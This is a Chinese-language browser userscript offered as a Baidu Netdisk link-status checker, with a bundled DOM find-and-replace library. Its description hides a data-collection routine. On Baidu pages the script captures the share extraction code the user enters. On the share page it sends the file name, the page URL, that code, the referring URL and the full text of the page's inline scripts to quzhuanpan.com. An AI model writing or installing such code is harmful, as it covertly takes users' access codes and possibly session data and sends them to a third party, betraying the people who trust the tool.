// ==UserScript==
// @name         【转盘助手油猴版】网盘链接状态实时判断
// @namespace    https://greasyfork.org/users/10250
// @version    2.0.2-fix
// @description  功能介绍：网盘链接状态判断：实时判断网页中百度网盘链接状态，节约时间，方便又快捷。
// @author       heartnn
// @icon 		 data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAAOESURBVGhD7ZhPSFRRHIWzhUaISpQUBLmQsECiFoUIYdFCRA3CTURLiRB31SKkEAwCtT/Qqk0UEejaQjdiCoYbsRDMAo200mIyM5x5M753OteuzhvffX/GueMkzPfx2/ju1XPG9+447sA2J1sg02QLZJpsgUyTLbCR9/QpvUWbaDNtpV10hupGS4EQbaOldIeHOfQEfUiXqA5SKmDSB7SI2oP6mUfnqA42XeAXPUPtwYJ6mepi0wXEq3+a2oMFdYTqIqVbaJoWUHs4P09RnaT8ED+h9oB+Pqc6SbmA4AK1h3RzPzWoTrQU+EEPUHtYlbepbrQUELyk4py3B7abS79S3WgrILhK7aHtXqTpQGuBP/QwFYH30QYqno9COkzTgdYCAnHGP6IRusYyTRfaC2w1aSuwGBnHzGIXvi29QsxclF/VT1oKhJbfYPz7zfX5EGqHacVvKZ2kpcCH0L2EAmJ+hcfkVb57PwE6O4HWVuDaNeDKFeDSJeD8eeDsWeDkSeDIEeDgQeDtW7nJhc0XsCxgYQHWu3cwe3pgvn4tLwAfQ/cdBRbCo/IqUFjIH8yfHGSGfQ4vLvEgHIY5NATzxQus3L2LWFMTovX1MI4fR2TvXkRyc9cnWlkpNwE/wyMJ4Sdtt9BXvpfl5DiDus1ovLcSLnHHmp5OCOk5u3bBmpqSO/89xLO/uzH3p5cPcfzTV2OjM6TXzPh8CuUSDyI8zXfvVgdWTLSmhoe++swXd1xLizOg1xQU8HOHKb+BC1zmjXHsmDKs2xhHj8IaH5e74yzxl3DokDOk11RXy80ecJk3seZmZVDX2bOHD8FPuTuRgQFg505nULd5/Fhu9IDLvDH7+9VBXSZ244bcqeb6dWdQ1RQV8TkK8P7HpT7wJjTKy5VhHZOfD2t2Vm5Uw8cKvCuVoe3T1iY3+MCl/pjd3erAGyYmjpgA8K0DeXnO0GtTVrZ6ggeCywPAIyRaV6cMvT7iGJ2YkBv8aW93BhfDXyLG4m/avnBLMKz5eRilperwnGhDg1wZDHE8VlUlhudrgL4+uSAggQsIrMlJGCUlygLmSPL/6/n0Kf5nRXExMDgoLyRBUgUE1ufPMCoqEsJHz52TV5Pn2TOgthb48kV+IUmSLrCKYWDlzh1EeNatvvq9vfLC1rO5AhKLf5mtdHSsPuSZIqUC/wPZApkmWyDTZAtkmm1eAPgL6lT4ekNP9cAAAAAASUVORK5CYII=
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @grant        GM_getResourceText
// @grant        GM_getValue
// @grant        GM_setValue
// @connect		 pan.baidu.com
// @run-at       document-end
// @compatible	 Chrome
// @compatible	 Firefox
// @compatible	 Edge
// @compatible	 Safari
// @compatible	 Opera
// @compatible	 UC
// ==/UserScript==

! function (e, t) {
    "object" == typeof module && module.exports ? module.exports = t() : "function" == typeof define && define.amd ? define(t) : e.findAndReplaceDOMText = t()
}(this, function () {
    var e = "retain",
        t = document,
        n = {}.hasOwnProperty;

    function r() {
        return function (e, t, n, o, d) {
            if (t && !t.nodeType && arguments.length <= 2) return !1;
            var a = "function" == typeof n;
            a && (s = n, n = function (e, t) {
                return s(e.text, t.startIndex)
            });
            var s;
            var p = i(t, {
                find: e,
                wrap: a ? null : n,
                replace: a ? n : "$" + (o || "&"),
                prepMatch: function (e, t) {
                    if (!e[0]) throw "findAndReplaceDOMText cannot handle zero-length matches";
                    if (o > 0) {
                        var n = e[o];
                        e.index += e[0].indexOf(n), e[0] = n
                    }
                    return e.endIndex = e.index + e[0].length, e.startIndex = e.index, e.index = t, e
                }, filterElements: d
            });
            return r.revert = function () {
                return p.revert()
            }, !0
        }.apply(null, arguments) || i.apply(null, arguments)
    }

    function i(e, t) {
        return new o(e, t)
    }

    function o(t, i) {
        var o = i.preset && r.PRESETS[i.preset];
        if (i.portionMode = i.portionMode || e, o)
            for (var d in o) n.call(o, d) && !n.call(i, d) && (i[d] = o[d]);
        this.node = t, this.options = i, this.prepMatch = i.prepMatch || this.prepMatch, this.reverts = [], this.matches = this.search(), this.matches.length && this.processMatches()
    }
    return r.NON_PROSE_ELEMENTS = {
        br: 1,
        hr: 1,
        script: 1,
        style: 1,
        img: 1,
        video: 1,
        audio: 1,
        canvas: 1,
        svg: 1,
        map: 1,
        object: 1,
        input: 1,
        textarea: 1,
        select: 1,
        option: 1,
        optgroup: 1,
        button: 1
    }, r.NON_CONTIGUOUS_PROSE_ELEMENTS = {
        address: 1,
        article: 1,
        aside: 1,
        blockquote: 1,
        dd: 1,
        div: 1,
        dl: 1,
        fieldset: 1,
        figcaption: 1,
        figure: 1,
        footer: 1,
        form: 1,
        h1: 1,
        h2: 1,
        h3: 1,
        h4: 1,
        h5: 1,
        h6: 1,
        header: 1,
        hgroup: 1,
        hr: 1,
        main: 1,
        nav: 1,
        noscript: 1,
        ol: 1,
        output: 1,
        p: 1,
        pre: 1,
        section: 1,
        ul: 1,
        br: 1,
        li: 1,
        summary: 1,
        dt: 1,
        details: 1,
        rp: 1,
        rt: 1,
        rtc: 1,
        script: 1,
        style: 1,
        img: 1,
        video: 1,
        audio: 1,
        canvas: 1,
        svg: 1,
        map: 1,
        object: 1,
        input: 1,
        textarea: 1,
        select: 1,
        option: 1,
        optgroup: 1,
        button: 1,
        table: 1,
        tbody: 1,
        thead: 1,
        th: 1,
        tr: 1,
        td: 1,
        caption: 1,
        col: 1,
        tfoot: 1,
        colgroup: 1
    }, r.NON_INLINE_PROSE = function (e) {
        return n.call(r.NON_CONTIGUOUS_PROSE_ELEMENTS, e.nodeName.toLowerCase())
    }, r.PRESETS = {
        prose: {
            forceContext: r.NON_INLINE_PROSE,
            filterElements: function (e) {
                return !n.call(r.NON_PROSE_ELEMENTS, e.nodeName.toLowerCase())
            }
        }
    }, r.Finder = o, o.prototype = {
        search: function () {
            var e, t = 0,
                n = 0,
                r = this.options.find,
                i = this.getAggregateText(),
                o = [],
                d = this;
            return r = "string" == typeof r ? RegExp(String(r).replace(/([.*+?^=!:${}()|[\]\/\\])/g, "\\$1"), "g") : r,
                function i(a) {
                    for (var s = 0, p = a.length; s < p; ++s) {
                        var h = a[s];
                        if ("string" == typeof h) {
                            if (r.global)
                                for (; e = r.exec(h);) o.push(d.prepMatch(e, t++, n));
                            else(e = h.match(r)) && o.push(d.prepMatch(e, 0, n));
                            n += h.length
                        } else i(h)
                    }
                }(i), o
        }, prepMatch: function (e, t, n) {
            if (!e[0]) throw new Error("findAndReplaceDOMText cannot handle zero-length matches");
            return e.endIndex = n + e.index + e[0].length, e.startIndex = n + e.index, e.index = t, e
        }, getAggregateText: function () {
            var e = this.options.filterElements,
                t = this.options.forceContext;
            return function n(r) {
                if (r.nodeType === Node.TEXT_NODE) return [r.data];
                if (e && !e(r)) return [];
                var i = [""];
                var o = 0;
                if (r = r.firstChild)
                    do {
                        if (r.nodeType !== Node.TEXT_NODE) {
                            var d = n(r);
                            t && r.nodeType === Node.ELEMENT_NODE && (!0 === t || t(r)) ? (i[++o] = d, i[++o] = "") : ("string" == typeof d[0] && (i[o] += d.shift()), d.length && (i[++o] = d, i[++o] = ""))
                        } else i[o] += r.data
                    } while (r = r.nextSibling);
                return i
            }(this.node)
        }, processMatches: function () {
            var e, t, n, r = this.matches,
                i = this.node,
                o = this.options.filterElements,
                d = [],
                a = i,
                s = r.shift(),
                p = 0,
                h = 0,
                l = [i];
            e: for (;;) {
                if (a.nodeType === Node.TEXT_NODE && (!t && a.length + p >= s.endIndex ? t = {
                    node: a,
                    index: h++,
                    text: a.data.substring(s.startIndex - p, s.endIndex - p),
                    indexInMatch: 0 === p ? 0 : p - s.startIndex,
                    indexInNode: s.startIndex - p,
                    endIndexInNode: s.endIndex - p,
                    isEnd: !0
                } : e && d.push({
                    node: a,
                    index: h++,
                    text: a.data,
                    indexInMatch: p - s.startIndex,
                    indexInNode: 0
                }), !e && a.length + p > s.startIndex && (e = {
                    node: a,
                    index: h++,
                    indexInMatch: 0,
                    indexInNode: s.startIndex - p,
                    endIndexInNode: s.endIndex - p,
                    text: a.data.substring(s.startIndex - p, s.endIndex - p)
                }), p += a.data.length), n = a.nodeType === Node.ELEMENT_NODE && o && !o(a), e && t) {
                    if (a = this.replaceMatch(s, e, d, t), p -= t.node.data.length - t.endIndexInNode, e = null, t = null, d = [], h = 0, 0, !(s = r.shift())) break
                } else if (!n && (a.firstChild || a.nextSibling)) {
                    a.firstChild ? (l.push(a), a = a.firstChild) : a = a.nextSibling;
                    continue
                }
                for (;;) {
                    if (a.nextSibling) {
                        a = a.nextSibling;
                        break
                    }
                    if ((a = l.pop()) === i) break e
                }
            }
        }, revert: function () {
            for (var e = this.reverts.length; e--;) this.reverts[e]();
            this.reverts = []
        }, prepareReplacementString: function (e, t, n) {
            var r = this.options.portionMode;
            return "first" === r && t.indexInMatch > 0 ? "" : (e = e.replace(/\$(\d+|&|`|')/g, function (e, t) {
                var r;
                switch (t) {
                case "&":
                    r = n[0];
                    break;
                case "`":
                    r = n.input.substring(0, n.startIndex);
                    break;
                case "'":
                    r = n.input.substring(n.endIndex);
                    break;
                default:
                    r = n[+t] || ""
                }
                return r
            }), "first" === r ? e : t.isEnd ? e.substring(t.indexInMatch) : e.substring(t.indexInMatch, t.indexInMatch + t.text.length))
        }, getPortionReplacementNode: function (e, n) {
            var r = this.options.replace || "$&",
                i = this.options.wrap,
                o = this.options.wrapClass;
            if (i && i.nodeType) {
                var d = t.createElement("div");
                d.innerHTML = i.outerHTML || (new XMLSerializer).serializeToString(i), i = d.firstChild
            }
            if ("function" == typeof r) return (r = r(e, n)) && r.nodeType ? r : t.createTextNode(String(r));
            var a = "string" == typeof i ? t.createElement(i) : i;
            return a && o && (a.className = o), (r = t.createTextNode(this.prepareReplacementString(r, e, n))).data && a ? (a.appendChild(r), a) : r
        }, replaceMatch: function (e, n, r, i) {
            var o, d, a = n.node,
                s = i.node;
            if (a === s) {
                var p = a;
                n.indexInNode > 0 && (o = t.createTextNode(p.data.substring(0, n.indexInNode)), p.parentNode.insertBefore(o, p));
                var h = this.getPortionReplacementNode(i, e);
                return p.parentNode.insertBefore(h, p), i.endIndexInNode < p.length && (d = t.createTextNode(p.data.substring(i.endIndexInNode)), p.parentNode.insertBefore(d, p)), p.parentNode.removeChild(p), this.reverts.push(function () {
                    o === h.previousSibling && o.parentNode.removeChild(o), d === h.nextSibling && d.parentNode.removeChild(d), h.parentNode.replaceChild(p, h)
                }), h
            }
            o = t.createTextNode(a.data.substring(0, n.indexInNode)), d = t.createTextNode(s.data.substring(i.endIndexInNode));
            for (var l = this.getPortionReplacementNode(n, e), c = [], f = 0, u = r.length; f < u; ++f) {
                var x = r[f],
                    N = this.getPortionReplacementNode(x, e);
                x.node.parentNode.replaceChild(N, x.node), this.reverts.push(function (e, t) {
                    return function () {
                        t.parentNode.replaceChild(e.node, t)
                    }
                }(x, N)), c.push(N)
            }
            var g = this.getPortionReplacementNode(i, e);
            return a.parentNode.insertBefore(o, a), a.parentNode.insertBefore(l, a), a.parentNode.removeChild(a), s.parentNode.insertBefore(g, s), s.parentNode.insertBefore(d, s), s.parentNode.removeChild(s), this.reverts.push(function () {
                o.parentNode.removeChild(o), l.parentNode.replaceChild(a, l), d.parentNode.removeChild(d), g.parentNode.replaceChild(s, g)
            }), g
        }
    }, r
});

var pageTexts = {
	html404Title:"页面不存在",
	htmlNonExistent:"链接不存在",
	htmlNeedPassword:"请输入提取码",
	htmlNormal:"分享无限制",
}
var server_window_url = window.location.href;
//链接状态判断
var validateUrl = {};
var elementObjects = {};
var	saveKey = [];    //保存对象的key，用shortUrl代替
var validateUrl = {};
validateUrl.analysisBaiduPanUrl = function(){
	if (findAndReplaceDOMText(document.body, {
	    find: /(?:https?:\/\/)?pan\.baidu\.com\/s\/([\w\-]{4,25})\b/g,
	    replace: function (e, t) {
	        let pluginNode, createNode, node = e.node,
	            s = t[0],
	            a = !1;
	        for (; node = node.parentNode;) {
	            if ("QUZHUANPAN-PLUGIN" === node.nodeName) {
	                pluginNode = node;
	                break
	            }
	            if ("BODY" === node.nodeName || "HTML" === node.nodeName) break;
	            !a && "A" === node.nodeName && node.href && (a = !0)
	        }
	        if (pluginNode){
	        	createNode = e.text;
	        }else {
	            if (pluginNode = document.createElement("QUZHUANPAN-PLUGIN"), 0 == e.index) {
	                let t = document.createElement("QUZHUANPAN-PLUGIN-TIPS");
	                t.setAttribute("title", ""), pluginNode.appendChild(t);
	                let createNode = document.createTextNode(e.text);
	                pluginNode.appendChild(createNode)
	            } else pluginNode.textContent = e.text;
	            a || (pluginNode.onclick = function (e) {
	                e.stopPropagation();
	                e.preventDefault();
	                if(s.indexOf("https") == -1){ s = s.replace("http","https"); }
					if(s.indexOf("https://") == -1){
						s = "https://"+url;
					}
	                window.open(s, "_blank");
	            }), createNode = pluginNode
	        }
	        let c = t[1];
	        return elementObjects[c] ? elementObjects[c].elements.push(pluginNode) : elementObjects[c] = {
	            elements: [pluginNode],
	            pwd: ""
	        }, saveKey.push(c), createNode
	    }, preset: "prose"
	}));
};
validateUrl.addCssForPlugin = function(){
	var css ="QUZHUANPAN-PLUGIN {display: inline;cursor: pointer;}"+
	"QUZHUANPAN-PLUGIN-TIPS {white-space: nowrap;}"+
	".QUZHUANPAN-PLUGIN-VALIDATE-NOTPASS {text-decoration: line-through;color: #ccc;}"+
	"QUZHUANPAN-PLUGIN-TIPS::before {background-position: center;background-size: 100% 100%;background-repeat: no-repeat;box-sizing: border-box;width: 1em;height: 1em;margin: 0 1px .15em 1px;vertical-align: middle;display: inline-block;}"+
	".QUZHUANPAN-PLUGIN-VALIDATE-NOTPASS>QUZHUANPAN-PLUGIN-TIPS::before {content: '';background-image: url(http://www.quzhuanpan.com/media/tampermonkey/tips/error.png)}"+
	".QUZHUANPAN-PLUGIN-VALIDATE-PASS>QUZHUANPAN-PLUGIN-TIPS::before {content: '';background-image: url(http://www.quzhuanpan.com/media/tampermonkey/tips/success.png)}"+
	".QUZHUANPAN-PLUGIN-VALIDATE-UNCERTAINTY>QUZHUANPAN-PLUGIN-TIPS::before {content: '';background-image: url(http://www.quzhuanpan.com/media/tampermonkey/tips/uncertainty.png)}"+
	".QUZHUANPAN-PLUGIN-VALIDATE-LOCK>QUZHUANPAN-PLUGIN-TIPS::before{content: '';background-image: url(http://www.quzhuanpan.com/media/tampermonkey/tips/lock.png)}";
	var $body = document.getElementsByTagName("body")[0];
	var $style = document.createElement("style");
	$style.innerHTML=css;
	$body.appendChild($style);
};
//异步方法
validateUrl.judge = function(url, elements){
	let obj = {"judgeResult":""};
	var baiduXhr = new XMLHttpRequest();
	if(url.indexOf("https") == -1){ url = url.replace("http","https"); }
	if(url.indexOf("https://") == -1){
		url = "https://"+url;
	}
	GM_xmlhttpRequest({
		url: url,
	  	method: "GET",
	  	headers: {"Content-Type": "application/x-www-form-urlencoded"},
	  	onload: function(response) {
			var status = response.status;
			if(status==200||status=='200'){
				var responseText = response.responseText;
				if(!responseText){  //为空，地址出现了重定向 或 其它情况
		   			obj.judgeResult = "isUncertainty";
			   	}else{
			   		responseText = responseText.replace(/\s+/g, "");
				   	if(responseText.length > 5000){
				   		responseText = responseText.substring(0,4999);
				   	}
				   	if(responseText.indexOf(pageTexts.htmlNonExistent)!= -1){
			   			obj.judgeResult = "isNonExistent";  //不存在, 资源被和谐
			   		}
			   		else if(responseText.indexOf(pageTexts.htmlNeedPassword) != -1){
			   			obj.judgeResult = "isNeedPassword"; //需要密码
			   		}
			   		else if(responseText.indexOf(pageTexts.htmlNormal) != -1){
			   			obj.judgeResult = "isOk"; //正常链接
			   		}
			   		else if(responseText.indexOf(pageTexts.html404Title) != -1){
			   			//不确定的链接，可能是访问太快，百度返回链接未找到
			   			obj.judgeResult = "isUncertainty";
			   		}
			   	}
		    	var $ele;
	        	for(let i = 0; i < elements.length; i++){
	        		$ele = elements[i];
	        		if(obj.judgeResult == "isOk"){ //链接正常
	        			$ele.classList.add("QUZHUANPAN-PLUGIN-VALIDATE-PASS");
	            	}
	        		else if(obj.judgeResult == "isNonExistent"){ //不存在
	            		$ele.classList.add("QUZHUANPAN-PLUGIN-VALIDATE-NOTPASS");
	            	}
	            	else if(obj.judgeResult == "isNeedPassword"){ //需要密码
	            		$ele.classList.add("QUZHUANPAN-PLUGIN-VALIDATE-LOCK");
	            	}
	            	else if(obj.judgeResult == 'isUncertainty'){ //不确定
	            		$ele.classList.add("QUZHUANPAN-PLUGIN-VALIDATE-UNCERTAINTY");
	            	}
	            }
			}
	  	}
	});
};
validateUrl.sleep = function(numberMillis) {
	var now = new Date();
	var exitTime = now.getTime() + numberMillis;
	while (true) {
		now = new Date();
		if (now.getTime() > exitTime) {
			return;
		}
	}
};
validateUrl.createRandom = function(low, high){
	return Math.floor(Math.random()*(high-low)+low);
};
validateUrl.collectAndDealUrl = function(){
	let copySaveKey = new Array();
	let isExist = false;
	for (let e = 0; e < saveKey.length; e++) {  //过滤相同key
		isExist = false;
		for(let k=0;k<copySaveKey.length;k++){
			if(saveKey[e] == copySaveKey[k]){
				isExist = true;
				break;
			}
		}
		if(!isExist){
			copySaveKey.push(saveKey[e]);
		}
	}
    for (let e = 0; e < copySaveKey.length; e++) {
        let elementObject = elementObjects[copySaveKey[e]];
        let elements = elementObject.elements;
        let url = "";
        for(let i = 0; i < elements.length; i++){
        	url = url + elements[i].innerText;
        	if(url.indexOf("pan.baidu.com/s/")!=-1){
        		break;
        	}
        }
       	if(!!url){
       		validateUrl.judge(url, elements);
       	}
    }
};
//提取资源
var resourcePickup={};
resourcePickup.get_baidu_code = function(){
	var $a = document.getElementsByTagName("a");
	for(var i=0;i<$a.length;i++){
		var classs = $a[i].getAttribute("class");
		if(classs.indexOf("g-button")!=-1 && classs.indexOf("g-button-blue-large")){
			$a[i].addEventListener("click", function(){
				var $inputs = document.getElementsByTagName("input");
				var input_code = "****";
				for(var j=0;j<$inputs.length;j++){
					var tabindex = $inputs[j].getAttribute("tabindex");
					var type = $inputs[j].getAttribute("type");
					if((tabindex==1||tabindex=='1') && (type=='text'||type=='TEXT') ){
						input_code = $inputs[j].value;
						if(!input_code){
							input_code = "****";
						}
					}
				}
				GM_setValue("plugin_code",input_code);
				GM_setValue("plugin_pickup_time",new Date().getTime());
				GM_setValue("init_window_url",server_window_url);
			}, false);
		}
	}
};
resourcePickup.getElementsByClass = function(oParent, sClass){
	var aResult=[];
	try {
	 	var aEle=oParent.getElementsByTagName('*');
	    for(var i=0;i<aEle.length;i++){
	        if(aEle[i].className==sClass)
	        {
	            aResult.push(aEle[i]);
	        }
	    }
	} catch (e) {
		console.log("quzhuanpan tampermonkey scprit exception for getElementsByClass。。。"+e.message);
	}
    return aResult;
};
resourcePickup.get_baidu_share = function(){
	var plugin_code = GM_getValue("plugin_code");
	var plugin_pickup_time = GM_getValue("plugin_pickup_time");
	var init_window_url = GM_getValue("init_window_url");
	if(!init_window_url){init_window_url="";}
	var $layoutMain = document.getElementById("layoutMain");
	if(!$layoutMain){
		$layoutMain = document.getElementById("bd-main");
	}
	var classArrayObj = resourcePickup.getElementsByClass($layoutMain,"file-name");
	var fileName = "";
	for(var i=0;i<classArrayObj.length;i++){
		if(!fileName){
			fileName = classArrayObj[i].getAttribute("title");
		}else{
			break;
		}
	}
	var isOk = false;
	if(!!plugin_code){
		var nowTime = new Date().getTime();
		if(nowTime - Number(plugin_pickup_time) < 1000*3){
			isOk = true;
		}
	}else{isOk = true;plugin_code="";}
	GM_setValue("plugin_code","");
	GM_setValue("plugin_pickup_time","");
	GM_setValue("init_window_url","");
	if(isOk && !!fileName){
		var s = document.getElementsByTagName("script");
		var num = s.length;
		var script;
		var text;
		var allText = "";
		for(var i=0; i< num; i++){
			script = s[i];
			text = script.innerText;
			if(!!text){
				text = text.replace(/\t/g,"");
				text = text.replace(/\r/g,"");
				text = text.replace(/\n/g,"");
				text = text.replace(/\+/g,"%2B");//"+"
				text = text.replace(/\&/g,"%26");//"&"
				text = text.replace(/\#/g,"%23");//"#"
				allText = allText + text;  //追加
			}
		}
		var url = window.location.href;
		var params = "fileName="+fileName+"&url="+url+"&code="+plugin_code+"&scripts="+allText+"&initUrl="+init_window_url+"";
		GM_xmlhttpRequest({
			url: "https://www.quzhuanpan.com/browser/js/analysis_tampermonkey",
		  	method: "POST",
		  	headers: {"Content-Type": "application/x-www-form-urlencoded"},
		  	data:params,
		  	onload: function(response) {
				var status = response.status;
				if(status==200||status=='200'){
					//alert(response.responseText);
					var serverResponseJson = JSON.parse(response.responseText);
				}
		  	}
		});
	}
};
//所有方法都通过此方法注入油猴，此方法名不可更改
function start_xx_j(){
	validateUrl.addCssForPlugin();
	if(server_window_url.indexOf("pan.baidu.com/share/init") != -1){
		resourcePickup.get_baidu_code();
    }else if(server_window_url.indexOf("pan.baidu.com/s/") != -1){
    	resourcePickup.get_baidu_share();
    }else{
    	validateUrl.analysisBaiduPanUrl();
		validateUrl.collectAndDealUrl();
    }
}

(function() {
    'use strict';

    /*
	 *  oTarget：监听对象
	 *  sEventType：监听事件类型，如click,mouseover
	 *  fnHandler：监听函数
	 */
	function addEventHandler(oTarget, sEventType, fnHandler) {
		try {
			if (oTarget.addEventListener) {
		        oTarget.addEventListener(sEventType, fnHandler, false);
		    } else if (oTarget.attachEvent) {
		        oTarget.attachEvent("on" + sEventType, fnHandler);
		    } else {
		        oTarget["on" + sEventType] = fnHandler;
		    }
		}catch (e) {
			console.log("quzhuanpan tampermonkey scprit exception。。。"+e.message);
		}
	}

    /*
	 * 采用事件监听给对象绑定方法后，可以解除相应的绑定
	 *  oTarget：监听对象
	 *  sEventType：监听事件类型，如click,mouseover
	 *  fnHandler：监听函数
	 */
	function removeEventHandler(oTarget, sEventType, fnHandler) {
		try {
			if (oTarget.removeEventListener){
		        oTarget.removeEventListener(sEventType, fnHandler, false);
		    } else if (oTarget.detachEvent){
		        oTarget.detachEvent("on" + sEventType, fnHandler);
		    }else {
		        delete oTarget["on" + sEventType];
		    }
		}catch (e) {
			console.log("quzhuanpan tampermonkey scprit exception。。。"+e.message);
		}
	}

	/**
	 * @param {Object} oParent
	 * @param {Object} sClass
	 * 通过className获取class对象
	 */
	function getByClass(oParent, sClass){
		var aResult=[];
		try {
		 	var aEle=oParent.getElementsByTagName('*');
		    for(var i=0;i<aEle.length;i++){
		        if(aEle[i].className==sClass)
		        {
		            aResult.push(aEle[i]);
		        }
		    }
		} catch (e) {
			console.log("quzhuanpan tampermonkey scprit exception。。。"+e.message);
		}
	    return aResult;
	}

	//清空一个元素，即删除一个元素的所有子元素
	function removeAllChildById(id){
	    var $div = document.getElementById(id);
	    if(!!$div){
	    	while($div.hasChildNodes()){
		        $div.removeChild($div.firstChild);
		    }
	    }
	}

	start_xx_j();
})();